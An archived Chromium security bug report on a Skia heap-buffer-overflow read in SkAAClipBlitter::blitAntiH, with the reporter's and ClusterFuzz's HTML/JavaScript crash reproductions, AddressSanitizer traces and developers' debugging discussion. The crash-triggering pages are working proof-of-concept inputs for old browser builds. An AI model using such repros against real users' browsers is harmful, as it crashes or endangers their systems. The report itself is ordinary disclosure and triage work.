# Heap-buffer-overflow in SkAAClipBlitter::blitAntiH

| Field | Value |
|-------|-------|
| **Issue ID** | [40051879](https://issues.chromium.org/issues/40051879) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals, Internals>GPU, Internals>Skia |
| **Reporter** | mi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2011-12-06 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

skia oob read?

the numbers in the repro are fairly magical. hopefully they aren't dependent on my screen resolution etc. :|

**VERSION**  

Chrome Version:  

Chromium 17.0.961.0 (Developer Build 112957)  

OS Linux  

WebKit 535.12 (trunk@101971)  

JavaScript V8 3.7.11

Operating System: linux 64bit

**REPRODUCTION CASE**

<html>
<head>
<style>
#el1 {
-webkit-transform: translate3d(0px, 77px, 0px);
}
#el3 {
border-bottom-left-radius: 1px;
width: 124px;
height: 1em;
}
</style>
<script>
function crash(){
el1 = document.createElement('div')
el1.setAttribute('id', 'el1')
document.body.appendChild(el1)
el2 = document.createElement('div')
el2.setAttribute('id', 'el2')
document.body.appendChild(el2)
el3 = document.createElement('iframe')
el3.setAttribute('id', 'el3')
el2.appendChild(document.createTextNode('A'))
el2.appendChild(el3)
el1.style.display='-webkit-inline-flexbox'
document.body.style.zoom=0.1299686836078763
setTimeout(function() {
el3.style.display='-webkit-inline-flexbox'
setTimeout(function() {
el1.style.display='table-footer-group'
setTimeout(function() {
el3.style.display='-webkit-box'
},0)
},0)
},0)
}
window.onload=crash
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==25948== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffe6001f96 at pc 0x555557a9cadf bp 0x7fffffff3570 sp 0x7fffffff3548  

READ of size 1 at 0x7fffe6001f96 thread T0  

#0 0x555557a9cadf in SkAAClipBlitter::blitAntiH(int, int, unsigned char const\*, short const\*) ???:0  

#1 0x555557a186c5 in vertish(int, int, int, int, SkBlitter\*, int) third\_party/skia/src/core/SkScan\_Antihair.cpp:0  

#2 0x555557a1442a in do\_anti\_hairline(int, int, int, int, SkIRect const\*, SkBlitter\*) third\_party/skia/src/core/SkScan\_Antihair.cpp:0

0x7fffe6001f96 is located 0 bytes to the right of 22-byte region [0x7fffe6001f80,0x7fffe6001f96)  

allocated by thread T0 here:  

#0 0x55555ce35287 in malloc /usr/local/google/asan/address-sanitizer/asan/asan\_malloc\_linux.cc:49  

#1 0x555557a8c7c9 in sk\_malloc\_throw(unsigned long) ???:0  

#2 0x555557a981c0 in SkAAClip::Builder::finish(SkAAClip\*) ???:0

## Attachments

- [win2.html](attachments/win2.html) (text/html; charset=us-ascii, 1.1 KB)
- [win-asan.txt](attachments/win-asan.txt) (text/x-c; charset=us-ascii, 10.1 KB)
- [win.html](attachments/win.html) (text/html; charset=us-ascii, 1.1 KB)
- [win2-asan.txt](attachments/win2-asan.txt) (text/x-c; charset=us-ascii, 21.3 KB)
- [0110.html](attachments/0110.html) (text/html; charset=us-ascii, 501 B)
- [asan-log.txt](attachments/asan-log.txt) (text/plain; charset=us-ascii, 13.0 KB)
- [my-dot-gclient.txt](attachments/my-dot-gclient.txt) (text/plain; charset=us-ascii, 797 B)
- [asan-no-inline-log.txt](attachments/asan-no-inline-log.txt) (text/plain; charset=us-ascii, 14.5 KB)

## Timeline

### sk...@chromium.org (2011-12-08)

I cannot reproduce on Windows, and don't have a linux machine with ASAN. Inferno: would you mind having a look to see if you can reproduce this?

### sk...@chromium.org (2011-12-08)

(I'm assuming render RCE = severity high)

### sk...@chromium.org (2011-12-08)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-12-08)

Please do not assign severity without first confirming that you can reproduce the issue.

### in...@chromium.org (2011-12-08)

Cannot reproduce on ASAN locally and neither on ClusterFuzz. Tried many times. 

Miaubiz, please try to provide a reliable repro. It will help us make progress on this.

### mi...@gmail.com (2012-02-01)

here is another repro. it is just as magical as the original one. repros 100% on my machine(tm) 

### in...@chromium.org (2012-02-01)

clusterfuzz report coming soon

### in...@chromium.org (2012-02-01)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=17431335

Uploader: inferno@chromium.org

Crash Type: Heap-buffer-overflow READ 1
Crash Address: 0x7f203926d4ee
Crash State:
  - crash stack -
  SkAAClipBlitter::blitAntiH
  vertish
  do_anti_hairline
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=107682:107863

Minimized Testcase (0.44 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96KoiDJdxnhHZej3jQEvqvyFFab0WECrpX4at00GcHSwAKkhKotBm2POHJ085jU2oT3gJqYUGJp0mKNCx1ti-_nbaU4C21JILt5r4lrwhufFGMDnUwKsLv0vMHlIpRXarP9GnPh-5z3166Cu_FMpcsdXZ6g_Q
<style>
  #el0 {
    padding-left: 100%;
 }
 #el1 {
 margin-left: 5px;
 width: 13ex;
 border-bottom-left-radius: 15px;
</style>
<script>
  onload = function() {
    el0 = document.createElement('div')
    el0.setAttribute('id', 'el0')
    document.body.appendChild(el0)
    el1 = document.createElement('iframe')
    el1.setAttribute('src', 'A')
    el1.setAttribute('id', 'el1')
    el0.appendChild(el1)
    document.body.style.zoom=0.75
  }
</script>

### in...@chromium.org (2012-02-01)

Mike, it regressed in range Skia: r2525:r2549, can you please take a look. it impacts upcoming m17.

### in...@chromium.org (2012-03-06)

Mike, looks like we already shipped this regression on m17 Stable. Can you please try to fix this so that we dont ship it to upcoming m18.

### in...@chromium.org (2012-03-06)

We don't want to ship with this regression on m18. adding labels.

### sc...@gmail.com (2012-03-06)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-06)

Whoops, looks like we let this one slip between the cracks.

Adding epoger@, who has been recently awesome in helping with Skia issues.

### [Deleted User] (2012-03-06)

I will look into this today... if/when we find a fix, should we try to get it into M17 also?  (At what point do we stop pushing security fixes into M17?)

### ka...@google.com (2012-03-06)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-06)

The last M17 train just left, but M18 is surprisingly close now (just 2 weeks) so that's a good train to catch.

### [Deleted User] (2012-03-06)

So far, I have been unable to reproduce this crash at all.  Any guidance on how I can do so?

I loaded all three samples I found above (win.html, win2.html, 0110.html) on all the browsers listed below, and did not see any crashes.  (I'm not using an ASANified build, but I should still see a crash, right?)

On my (home) Windows Vista desktop:
19.0.1061.0 (Official Build 125116) canary
17.0.963.66 (Official Build 124982) m

On my (Google) MacBook Pro with 10.6.8:
19.0.1061.0 (Official Build 125116) canary
19.0.1030.0 (Developer Build 120475) downloaded from http://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?path=Mac/120475/


### [Deleted User] (2012-03-06)

(Instructions for how to repro this with my own developer build on Mac would be the most useful for me, if that is indeed possible.)

### sc...@gmail.com (2012-03-06)

ASAN will see things that non-ASAN builds can not :)

Getting ASAN for Mac is documented here: http://www.chromium.org/developers/testing/addresssanitizer

I will quickly try this on my ASAN M18 branch build, in case one of the other changes fixed this.

### sc...@gmail.com (2012-03-06)

I confirm that 0110.html in https://crbug.com/chromium/106577#c6 hits an out-of-bounds access for me with the latest code on the M18 branch under an ASAN build.

The repro in https://crbug.com/chromium/106577#c0 doesn't do it for me.

### ep...@google.com (2012-03-06)

I have just now finished creating an ASANified build on Mac.  (In parallel, I tried to build one on Linux, but ran into trouble.)

First thing tomorrow, I will see if I can repro the crash in my ASANified Mac build, and take it from there.

### ep...@google.com (2012-03-07)

I have tried all 3 samples (0110.html, win.html, win2.html) on my ASANified tip-of-tree (M19) Mac build, on my MacPro desktop, and I do not see any errors.

scarybeasts, did you see this on a Mac or was it some other platform?  What does your reproducing browser output on the pages listed below?

I will try to create an ASANified M18 build and see if I get the failure...

chrome://version
Chromium	19.0.1062.0 (Developer Build 125222)
OS	Mac OS X
WebKit	536.3 (trunk/Source/WebCore/Configurations@109784)
JavaScript	V8 3.9.13
Flash	11.1.102.62
User Agent	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3
Command Line	 out/Release/Chromium.app/Contents/MacOS/Chromium --flag-switches-begin --flag-switches-end
Executable Path	/Volumes/MacintoshHD2/epoger/src/tip-asan/src/out/Release/Chromium.app/Contents/MacOS/Chromium
Profile Path	/Users/epoger/Library/Application Support/Chromium/Default

chrome://gpu/
Graphics Feature Status
Canvas: Hardware accelerated
HTML Rendering: Hardware accelerated
3D CSS: Hardware accelerated
WebGL: Hardware accelerated
WebGL multisampling: Unavailable. Hardware acceleration unavailable
Problems Detected
Multisampling is buggy in ATI cards on older MacOSX.: 67752, 83153
Version Information
Data exported	Wed Mar 07 2012 10:48:09 GMT-0500 (EST)
Chrome version	19.0.1062.0 (Developer Build 125222)
Operating system	Mac OS X 10.6.8
Software rendering list version	1.25
ANGLE revision	993
2D graphics backend	Skia
Performance Information
Graphics	0.0
Gaming	0.0
Overall	0.0
Driver Information
Initialization time	31
Vendor Id	0x1002
Device Id	0x68b8
Optimus	false
Driver vendor	
Driver version	1.6.36
Driver date	
Pixel shader version	1.20
Vertex shader version	1.20
GL version	2.1
GL_VENDOR	ATI Technologies Inc.
GL_RENDERER	ATI Radeon HD 5770 OpenGL Engine
GL_VERSION	2.1 ATI-1.6.36
GL_EXTENSIONS	GL_ARB_transpose_matrix GL_ARB_vertex_program GL_ARB_vertex_blend GL_ARB_window_pos GL_ARB_shader_objects GL_ARB_vertex_shader GL_ARB_shading_language_100 GL_EXT_multi_draw_arrays GL_EXT_clip_volume_hint GL_EXT_rescale_normal GL_EXT_draw_range_elements GL_EXT_fog_coord GL_EXT_gpu_program_parameters GL_EXT_geometry_shader4 GL_EXT_transform_feedback GL_APPLE_client_storage GL_APPLE_specular_vector GL_APPLE_transform_hint GL_APPLE_packed_pixels GL_APPLE_fence GL_APPLE_vertex_array_object GL_APPLE_vertex_program_evaluators GL_APPLE_element_array GL_APPLE_flush_render GL_APPLE_aux_depth_stencil GL_NV_texgen_reflection GL_NV_light_max_exponent GL_IBM_rasterpos_clip GL_SGIS_generate_mipmap GL_ARB_imaging GL_ARB_point_parameters GL_ARB_texture_env_crossbar GL_ARB_texture_border_clamp GL_ARB_multitexture GL_ARB_texture_env_add GL_ARB_texture_cube_map GL_ARB_texture_env_dot3 GL_ARB_multisample GL_ARB_texture_env_combine GL_ARB_texture_compression GL_ARB_texture_mirrored_repeat GL_ARB_shadow GL_ARB_depth_texture GL_ARB_shadow_ambient GL_ARB_fragment_program GL_ARB_fragment_program_shadow GL_ARB_fragment_shader GL_ARB_occlusion_query GL_ARB_point_sprite GL_ARB_texture_non_power_of_two GL_ARB_vertex_buffer_object GL_ARB_pixel_buffer_object GL_ARB_draw_buffers GL_ARB_shader_texture_lod GL_ARB_color_buffer_float GL_ARB_half_float_vertex GL_ARB_texture_rg GL_ARB_texture_compression_rgtc GL_ARB_framebuffer_object GL_EXT_compiled_vertex_array GL_EXT_draw_buffers2 GL_EXT_framebuffer_object GL_EXT_framebuffer_blit GL_EXT_framebuffer_multisample GL_EXT_texture_rectangle GL_ARB_texture_rectangle GL_EXT_texture_env_add GL_EXT_blend_color GL_EXT_blend_minmax GL_EXT_blend_subtract GL_EXT_texture_lod_bias GL_EXT_abgr GL_EXT_bgra GL_EXT_stencil_wrap GL_EXT_texture_filter_anisotropic GL_EXT_separate_specular_color GL_EXT_secondary_color GL_EXT_blend_func_separate GL_EXT_shadow_funcs GL_EXT_stencil_two_side GL_EXT_texture_compression_s3tc GL_EXT_texture_compression_dxt1 GL_EXT_texture_sRGB GL_EXT_blend_equation_separate GL_EXT_texture_mirror_clamp GL_EXT_packed_depth_stencil GL_EXT_bindable_uniform GL_EXT_texture_integer GL_EXT_gpu_shader4 GL_EXT_framebuffer_sRGB GL_EXT_provoking_vertex GL_APPLE_flush_buffer_range GL_APPLE_ycbcr_422 GL_APPLE_rgb_422 GL_APPLE_vertex_array_range GL_APPLE_texture_range GL_APPLE_float_pixels GL_ATI_texture_float GL_ARB_texture_float GL_ARB_half_float_pixel GL_APPLE_pixel_buffer GL_APPLE_object_purgeable GL_NV_blend_square GL_NV_fog_distance GL_NV_conditional_render GL_ATI_texture_mirror_once GL_ATI_blend_equation_separate GL_ATI_blend_weighted_minmax GL_ATI_texture_env_combine3 GL_ATI_separate_stencil GL_ATI_texture_compression_3dc GL_SGIS_texture_edge_clamp GL_SGIS_texture_lod GL_SGI_color_matrix GL_EXT_texture_array GL_EXT_vertex_array_bgra GL_ARB_instanced_arrays GL_ARB_depth_buffer_float GL_EXT_packed_float GL_EXT_texture_shared_exponent


### sc...@gmail.com (2012-03-07)

Sorry that this one is proving such a pain, Elliot :-/

I'm on Linux 64-bit, ASAN and:

chrome://version
Chromium	18.0.1025.51 (Developer Build 125293)
OS	Linux
WebKit	535.19 (@107023)
JavaScript	V8 3.8.9.13
Flash	11.1 r102
User Agent	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.51 Safari/535.19
Command Line	 ./out/Release/chrome --flag-switches-begin --flag-switches-end
Executable Path	/home/chris/chrome_m18_asan/src/out/Release/chrome
Profile Path	/home/chris/.config/chromium/Default

chrome://gpu
Graphics Feature Status
Canvas: Software only, hardware acceleration unavailable
HTML Rendering: Hardware accelerated
3D CSS: Hardware accelerated
WebGL: Hardware accelerated
WebGL multisampling: Hardware accelerated
Problems Detected
Accelerated 2d canvas is unstable in Linux at the moment.
Version Information
Data exported	Wed Mar 07 2012 08:52:10 GMT-0800 (PST)
Chrome version	18.0.1025.51 (Developer Build 125293)
Operating system	Linux 2.6.32-35-generic
Software rendering list version	1.25
ANGLE revision	988
2D graphics backend	Skia
Performance Information
Graphics	0.0
Gaming	0.0
Overall	0.0
Driver Information
Initialization time	0
Vendor Id	0x10de
Device Id	0x0658
Optimus	false
Driver vendor	
Driver version	
Driver date	
Pixel shader version	
Vertex shader version	
GL version	
GL_VENDOR	
GL_RENDERER	
GL_VERSION	
GL_EXTENSIONS	

### sc...@gmail.com (2012-03-07)

If you like I can rebuild my trunk build with ASAN to see if maybe something since M18 fixed it?

### ep...@google.com (2012-03-07)

I wish I were having better luck building ASAN (or any Chromium) on Linux... scarybeasts, any chance you are able to reproduce on Mac?

The M18 ASAN build is compiling on my Mac right now.  I'll check it after lunch, and if I can't reproduce it there, I can dig more into my Linux build problems...

### sc...@gmail.com (2012-03-07)

I do not have a Mac :-/
The MAC M18 ASAN build should give us good info on whether the problem is platform specific or branch specific.

### ep...@google.com (2012-03-07)

The M18-branch ASAN build appeared to succeed, but when I run it I get a segfault immediately!

Stacktrace below... I'm going to see if I can get my ASAN build on Linux to work.

$ gdb out/Release/Chromium.app/Contents/MacOS/Chromium
GNU gdb 6.3.50-20050815 (Apple version gdb-1515) (Sat Jan 15 08:33:48 UTC 2011)
Copyright 2004 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "x86_64-apple-darwin"...Reading symbols for shared libraries ..... done

(gdb) run
Starting program: /Users/epoger/src/chrome/branch_m18-ASAN/src/out/Release/Chromium.app/Contents/MacOS/Chromium 
Reading symbols for shared libraries .++++.............................................................................................................. done

Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0x37fff95c
0x02c85e98 in ChromeMain ()
(gdb) backtrace
#0  0x02c85e98 in ChromeMain ()
#1  0x024d62bd in ChromeMain ()
#2  0x9a33abb4 in call_load_methods ()
#3  0x9a33a92e in load_images ()
#4  0x8fe036c8 in __dyld__ZN4dyldL12notifySingleE17dyld_image_statesPK11ImageLoader ()
#5  0x8fe0d30a in __dyld__ZN11ImageLoader23recursiveInitializationERKNS_11LinkContextEj ()
#6  0x8fe0d2c2 in __dyld__ZN11ImageLoader23recursiveInitializationERKNS_11LinkContextEj ()
#7  0x8fe0d3d1 in __dyld__ZN11ImageLoader15runInitializersERKNS_11LinkContextE ()
#8  0x8fe024a9 in __dyld__ZN4dyld24initializeMainExecutableEv ()
#9  0x8fe07950 in __dyld__ZN4dyld5_mainEPK12macho_headermiPPKcS5_S5_ ()
#10 0x8fe018b1 in __dyld__ZN13dyldbootstrap5startEPK12macho_headeriPPKcl ()
#11 0x8fe01057 in __dyld__dyld_start ()
(gdb) 


### kc...@chromium.org (2012-03-07)

+glider to check what's wrong with asan on Mac. 

### ep...@google.com (2012-03-08)

FINALLY, I got an ASAN build of M18 Chrome to work on Linux, and reproduce the failure!

For posterity's sake: I had lots of trouble trying to combine goma and ASAN.  Here's how I was finally able to successfully build and reproduce the error...

$ cd branch_m18-asan/src
$ rm -rf out
$ tools/clang/scripts/update.sh
$ GYP_DEFINES='asan=1 linux_use_tcmalloc=0 release_extra_cflags="-g" ' gclient runhooks
$ make -j16 BUILDTYPE=Release base_unittests
$ out/Release/base_unittests --gtest_filter=ToolsSanityTest.DISABLED_AddressSanitizerLocalOOBCrashTest --gtest_also_run_disabled_tests 2>&1 | third_party/asan/scripts/asan_symbolize.py `pwd`/  | c++filt
[... I saw the expected error...]
$ make -j16 BUILDTYPE=Release chrome
$ out/Release/chrome file:///home/epoger/Downloads/0110.html &>/tmp/out
[... Chromium launches and I see a crashy sad face...]
$ cat /tmp/out | third_party/asan/scripts/asan_symbolize.py `pwd`/ >/tmp/asan-log.txt

Adding Mike... I will look over the ASAN log with him, and now that I have a locally reproducing build we can try out some fixes.

### ep...@google.com (2012-03-08)

Mike noticed that the asan-log.txt stack trace in the previous comment is a bit suspicious... the line numbers within the source files don't seem to line up quite right.  

Looking at http://www.chromium.org/developers/testing/addresssanitizer , I have followed the advice labeled "If you want your stack traces to be precise, you will have to disable inlining..."

$ cd /usr/local/google/home/epoger/src/chrome/branch_m18-asan/src
$ tools/clang/scripts/update.sh
$ GYP_DEFINES='asan=1 linux_use_tcmalloc=0 release_extra_cflags="-g -O1 -fno-inline-functions -fno-inline" ' gclient runhooks
$ make -j16 BUILDTYPE=Release base_unittests
$ out/Release/base_unittests --gtest_filter=ToolsSanityTest.DISABLED_AddressSanitizerLocalOOBCrashTest --gtest_also_run_disabled_tests 2>&1 | third_party/asan/scripts/asan_symbolize.py `pwd`/  | c++filt
$ make -j16 BUILDTYPE=Release chrome
$ out/Release/chrome file:///home/epoger/Downloads/0110.html &>/tmp/out
$ cat /tmp/out | third_party/asan/scripts/asan_symbolize.py `pwd`/ >/tmp/asan-no-inline-log.txt

The resulting stack trace has some different line numbers, but they still look wrong to me. :-(  Mike, any thoughts on these stack traces?

In the meanwhile, I am building an ASANified version at tip-of-tree to see if I can repro the failure there too.

### ep...@google.com (2012-03-08)

P.S. The source files corresponding to the stack traces can be found here:
http://code.google.com/p/skia/source/browse/branches/chrome/1025/src/core/SkAAClip.cpp
http://code.google.com/p/skia/source/browse/branches/chrome/1025/src/core/SkScan_Antihair.cpp
http://code.google.com/p/skia/source/browse/branches/chrome/1025/src/core/SkScan_Hairline.cpp


### [Deleted User] (2012-03-08)

anyone -- can we run asan such that when it finds a problem, we can attach GDB and see the stack live?

### in...@chromium.org (2012-03-08)

you can attach gdb to asanified chrome and it should work!

### [Deleted User] (2012-03-08)

we are attached, but gdb did not automatically stop when we hit the asan complaint :( Is there something else we need to do?

### kc...@chromium.org (2012-03-08)

You can set a break point on __asan_report_error -- this will stop gdb just before asan prints the error. 
You can also set a break point on __asan::AsanDie -- this will stop the debugger right after the report is printed. 
Or you can set env. var. ASAN_OPTIONS=sleep_before_dying=10000 and then attach gdb to the sleeping process right after it printed the warning. 

### kc...@chromium.org (2012-03-08)

The sad part here is that you can get nice stack traces out of gdb with asan, but the rest of the debug info (e.g variable names, types, etc) are not reliable. 
http://code.google.com/p/address-sanitizer/issues/detail?id=41



### sc...@gmail.com (2012-03-08)

Or if the ASAN line numbers are looking weird, just compile in an explicit out-of-bounds assert() check that fires when the buffer boundary condition indicated by ASAN is hit.

aka. printf-debugging etc. :D

### ep...@google.com (2012-03-08)

I can't get chromium+asan to build at tip-of-tree (it hangs during link), so scarybeasts is going to try that and see if the bug repros at tip-of-tree.

In the meanwhile, Mike and I will poke at the M18 branch build.

### sc...@gmail.com (2012-03-09)

I was able to build / link with ASAN at ToT. This is release mode build.


==5973== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f282afb9aee at pc 0x7f28405e5cef bp 0x7fffae45b810 sp 0x7fffae45b808
READ of size 1 at 0x7f282afb9aee thread T0
    #0 0x7f28405e5cef in merge third_party/skia/src/core/SkAAClip.cpp:1895
    #1 0x7f284055e986 in vertish third_party/skia/src/core/SkScan_Antihair.cpp:193
    #2 0x7f284055a73a in do_anti_hairline third_party/skia/src/core/SkScan_Antihair.cpp:386
    #3 0x7f2840559e1c in SkScan::AntiHairLineRgn(SkPoint const&, SkPoint const&, SkRegion const*, SkBlitter*) third_party/skia/src/core/SkScan_Antihair.cpp:449
    #4 0x7f2840560441 in hair_path third_party/skia/src/core/SkScan_Hairline.cpp:286
    #5 0x7f28404e951a in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) const third_party/skia/src/core/SkDraw.cpp:1013
    #6 0x7f28404d758f in SkCanvas::drawPath(SkPath const&, SkPaint const&) third_party/skia/src/core/SkCanvas.cpp:1396
    #7 0x7f2844724bc1 in gfx::NativeThemeBase::PaintArrowButton(SkCanvas*, gfx::Rect const&, gfx::NativeTheme::Part, gfx::NativeTheme::State) const ui/gfx/native_theme_base.cc:301
    #8 0x7f2844723870 in gfx::NativeThemeBase::Paint(SkCanvas*, gfx::NativeTheme::Part, gfx::NativeTheme::State, gfx::Rect const&, gfx::NativeTheme::ExtraParams const&) const ui/gfx/native_theme_base.cc:170
    #9 0x7f28433797a1 in webkit_glue::WebThemeEngineImpl::paint(SkCanvas*, WebKit::WebThemeEngine::Part, WebKit::WebThemeEngine::State, WebKit::WebRect const&, WebKit::WebThemeEngine::ExtraParams const*) webkit/glue/webthemeengine_impl_linux.cc:179
    #10 0x7f28408fb73a in WebCore::PlatformSupport::paintThemePart(WebCore::GraphicsContext*, WebCore::PlatformSupport::ThemePart, WebCore::PlatformSupport::ThemePaintState, WebCore::IntRect const&, WebCore::PlatformSupport::ThemePaintExtraParams const*) third_party/WebKit/Source/WebKit/chromium/src/PlatformSupport.cpp:944
    #11 0x7f28414ab335 in WebCore::ScrollbarThemeComposite::paint(WebCore::ScrollbarThemeClient*, WebCore::GraphicsContext*, WebCore::IntRect const&) third_party/WebKit/Source/WebCore/platform/ScrollbarThemeComposite.cpp:91
    #12 0x7f28412ab1a2 in WebCore::Scrollbar::paint(WebCore::GraphicsContext*, WebCore::IntRect const&) third_party/WebKit/Source/WebCore/platform/Scrollbar.cpp:198
    #13 0x7f2841d1f93a in WebCore::FrameView::paintScrollbar(WebCore::GraphicsContext*, WebCore::Scrollbar*, WebCore::IntRect const&) third_party/WebKit/Source/WebCore/page/FrameView.cpp:2739
    #14 0x7f28412a08af in WebCore::ScrollView::paintScrollbars(WebCore::GraphicsContext*, WebCore::IntRect const&) third_party/WebKit/Source/WebCore/platform/ScrollView.cpp:990
    #15 0x7f28412a1720 in ~GraphicsContextStateSaver third_party/WebKit/Source/WebCore/platform/graphics/GraphicsContext.h:571
    #16 0x7f2842542c4a in WebCore::RenderWidget::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) third_party/WebKit/Source/WebCore/rendering/RenderWidget.cpp:290
    #17 0x7f28421cc7c4 in WebCore::InlineBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&, int, int) third_party/WebKit/Source/WebCore/rendering/InlineBox.cpp:233
    #18 0x7f28421dfd55 in WebCore::InlineBox::nextOnLine() const third_party/WebKit/Source/WebCore/rendering/InlineBox.h:185
    #19 0x7f2842548a91 in WebCore::RootInlineBox::hasEllipsisBox() const third_party/WebKit/Source/WebCore/rendering/RootInlineBox.h:95
    #20 0x7f2842413711 in WebCore::InlineFlowBox::nextLineBox() const third_party/WebKit/Source/WebCore/rendering/InlineFlowBox.h:73
    #21 0x7f2842234e45 in WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, WebCore::IntPoint const&) third_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2781
    #22 0x7f2842230106 in WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) third_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2635
    #23 0x7f28422340c3 in WebCore::RenderObject::RenderObjectBitfields::childrenInline() const third_party/WebKit/Source/WebCore/rendering/RenderObject.h:972
    #24 0x7f2842234e57 in WebCore::RenderObject::document() const third_party/WebKit/Source/WebCore/rendering/RenderObject.h:542
    #25 0x7f2842230106 in WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) third_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2635
    #26 0x7f28422340c3 in WebCore::RenderObject::RenderObjectBitfields::childrenInline() const third_party/WebKit/Source/WebCore/rendering/RenderObject.h:972
    #27 0x7f2842234e57 in WebCore::RenderObject::document() const third_party/WebKit/Source/WebCore/rendering/RenderObject.h:542
    #28 0x7f2842230106 in WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) third_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2635
    #29 0x7f28423cca01 in WebCore::RenderLayer::paintLayerContents(WebCore::RenderLayer*, WebCore::GraphicsContext*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject*, WebCore::RenderRegion*, WTF::HashMap<WebCore::OverlapTestRequestClient*, WebCore::IntRect, WTF::PtrHash<WebCore::OverlapTestRequestClient*>, WTF::HashTraits<WebCore::OverlapTestRequestClient*>, WTF::HashTraits<WebCore::IntRect> >*, unsigned int) third_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2935
    #30 0x7f28423c9bf5 in WebCore::RenderLayer::paintLayer(WebCore::RenderLayer*, WebCore::GraphicsContext*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject*, WebCore::RenderRegion*, WTF::HashMap<WebCore::OverlapTestRequestClient*, WebCore::IntRect, WTF::PtrHash<WebCore::OverlapTestRequestClient*>, WTF::HashTraits<WebCore::OverlapTestRequestClient*>, WTF::HashTraits<WebCore::IntRect> >*, unsigned int) third_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2817
    #31 0x7f28423cd2db in WebCore::RenderLayer::paintList(WTF::Vector<WebCore::RenderLayer*, 0ul>*, WebCore::RenderLayer*, WebCore::GraphicsContext*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject*, WebCore::RenderRegion*, WTF::HashMap<WebCore::OverlapTestRequestClient*, WebCore::IntRect, WTF::PtrHash<WebCore::OverlapTestRequestClient*>, WTF::HashTraits<WebCore::OverlapTestRequestClient*>, WTF::HashTraits<WebCore::IntRect> >*, unsigned int) third_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2999
    #32 0x7f28423c9bf5 in WebCore::RenderLayer::paintLayer(WebCore::RenderLayer*, WebCore::GraphicsContext*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject*, WebCore::RenderRegion*, WTF::HashMap<WebCore::OverlapTestRequestClient*, WebCore::IntRect, WTF::PtrHash<WebCore::OverlapTestRequestClient*>, WTF::HashTraits<WebCore::OverlapTestRequestClient*>, WTF::HashTraits<WebCore::IntRect> >*, unsigned int) third_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2817
    #33 0x7f28423c86cd in WebCore::RenderLayer::paint(WebCore::GraphicsContext*, WebCore::IntRect const&, unsigned int, WebCore::RenderObject*, WebCore::RenderRegion*, unsigned int) third_party/WebKit/Source/WebCore/rendering/RenderLayer.cpp:2633
    #34 0x7f2841d20c15 in WebCore::RenderLayer::containsDirtyOverlayScrollbars() const third_party/WebKit/Source/WebCore/rendering/RenderLayer.h:558
    #35 0x7f28412a13fa in ~GraphicsContextStateSaver third_party/WebKit/Source/WebCore/platform/graphics/GraphicsContext.h:571
    #36 0x7f284084d077 in WebKit::WebFrameImpl::paintWithContext(WebCore::GraphicsContext&, WebKit::WebRect const&) third_party/WebKit/Source/WebKit/chromium/src/WebFrameImpl.cpp:2062
    #37 0x7f284084d3d4 in ~GraphicsContextBuilder third_party/WebKit/Source/WebKit/chromium/src/painting/GraphicsContextBuilder.h:63
    #38 0x7f2840891e01 in WebKit::WebViewImpl::paint(SkCanvas*, WebKit::WebRect const&) third_party/WebKit/Source/WebKit/chromium/src/WebViewImpl.cpp:1386
    #39 0x7f2843f165a8 in RenderWidget::PaintRect(gfx::Rect const&, gfx::Point const&, skia::PlatformCanvas*) content/renderer/render_widget.cc:676
    #40 0x7f2843f0c240 in std::vector<gfx::Rect, std::allocator<gfx::Rect> >::size() const /usr/lib/gcc/x86_64-linux-gnu/4.4/../../../../include/c++/4.4/bits/stl_vector.h:533
    #41 0x7f2843f0f825 in scoped_ptr<IPC::Message>::get() const ./base/memory/scoped_ptr.h:175
    #42 0x7f2843f0de5c in RenderWidget::OnMessageReceived(IPC::Message const&) content/renderer/render_widget.cc:218
    #43 0x7f2843eb692f in RenderViewImpl::OnMessageReceived(IPC::Message const&) content/renderer/render_view_impl.cc:827
    #44 0x7f284038d599 in MessageRouter::RouteMessage(IPC::Message const&) content/common/message_router.cc:46
    #45 0x7f284038d400 in MessageRouter::OnMessageReceived(IPC::Message const&) content/common/message_router.cc:39
    #46 0x7f28402a852c in ChildThread::OnMessageReceived(IPC::Message const&) content/common/child_thread.cc:203
